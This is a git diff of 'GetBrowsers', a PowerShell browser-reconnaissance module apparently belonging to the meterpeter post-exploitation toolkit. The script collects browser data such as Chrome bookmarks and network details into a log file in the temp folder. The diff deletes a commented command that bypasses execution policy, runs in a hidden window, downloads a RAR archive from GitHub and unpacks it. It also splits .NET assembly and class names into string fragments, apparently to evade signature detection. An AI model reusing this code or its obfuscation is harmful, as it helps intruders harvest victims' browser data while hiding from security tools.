@@ -75,23 +75,11 @@
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
-# powershell -executionpolicy bypass -w 1 -command (New-Object System.Net.WebClient).DownloadFile("https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.rar","$env:tmp\DarkRCovery.rar");cmd /R set unrar="%programFiles%\WinRAR\UnRAR.exe" && cd %tmp% && %unrar% e "DarkRCovery.rar"
-
-
-# param (
-#  [Parameter(Mandatory=$true,Position=0)]$IE,
-#  [Parameter(Mandatory=$true,Position=0)]$RECON,
-#  [Parameter(Mandatory=$true,Position=0)]$CHROME,
-#  [Parameter(Mandatory=$true,Position=0)]$FIREFOX,
-#  [Parameter(Mandatory=$false,Position=1)][string]$LOGFILEPATH
-# )
-
-
-$IPATH = pwd
 $Path = $null
 $mpset = $False
 $param1 = $args[0] # User Inputs [Arguments]
 $param2 = $args[1] # User Inputs [Arguments]
+$IPATH = pwd|Select-Object -ExpandProperty Path
 $host.UI.RawUI.WindowTitle = " @GetBrowsers v1.18"
 ## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
 If(-not($param2)){$LogFilePath = "$env:TMP"}else{If($param2 -match '^[0-9]'){$LogFilePath = "$env:TMP";$param2 = $param2}else{$LogFilePath = "$param2";$mpset = $True}}
@@ -182,14 +170,6 @@ echo "Gateway      : $RGateway" >> $LogFilePath\BrowserEnum.log
 echo "$statsdata" >> $LogFilePath\BrowserEnum.log
 echo "$deliverdata" >> $LogFilePath\BrowserEnum.log
 ## END Off { @args -WINVER }
-
-
-function ConvertFrom-Json20([object] $item){
-    ## Json Files Convertion to text
-    Add-Type -AssemblyName System.Web.Extensions
-    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-    return ,$ps_js.DeserializeObject($item)    
-}
 
 
 function BROWSER_RECON {
@@ -632,6 +612,14 @@ function FIREFOX {
 }
 
 
+function ConvertFrom-Json20([object] $item){
+    $RawString = "System.W"+"eb.Ext"+"ensions" -Join ''
+    $JavaSerial = "System.W"+"eb.Scri"+"pt.Serial"+"ization.Jav"+"aScriptSe"+"rializer" -Join ''
+    Add-Type -AssemblyName $RawString
+    $powers_js = New-Object $JavaSerial
+    return ,$powers_js.DeserializeObject($item) 
+}
+
 function CHROME {
     ## Retrieve Google Chrome Browser Information
     echo "`n`nChrome Browser" >> $LogFilePath\BrowserEnum.log
@@ -757,7 +745,7 @@ function CHROME {
             echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-            $Output = ConvertFrom-Json20($Json)
+            $Output = ConvertFrom-Json20($Json) ## TODO:
             $Jsonobject = $Output.roots.bookmark_bar.children
             $Jsonobject.url|Sort -Unique|ForEach-Object {
                 if ($_ -match $Search) {
